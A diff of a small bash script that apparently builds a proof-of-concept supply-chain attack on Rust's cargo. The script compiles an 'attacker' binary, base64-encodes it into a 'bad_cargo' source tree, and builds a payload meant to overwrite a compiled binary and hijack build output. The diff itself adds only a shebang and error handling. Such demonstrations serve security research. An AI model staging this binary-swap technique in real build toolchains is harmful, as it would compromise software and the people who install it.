@@ -1,8 +1,9 @@
+#!/bin/bash
 # Build "compromised" hello world program and add base64 to source
-pushd ../attacker_project
+pushd ../attacker_project || exit
 cargo build --release --target x86_64-unknown-linux-musl
 base64 -w0 ./target/x86_64-unknown-linux-musl/release/attacker_project > ../bad_cargo/src/overwrite_binary/base64_attacker_binary
-popd
+popd || exit
 
 # Build payload that overwrites built binary and stage it for "compromised" output hijacking cargo source
 cargo build --release --bin overwrite_binary --target x86_64-unknown-linux-musl
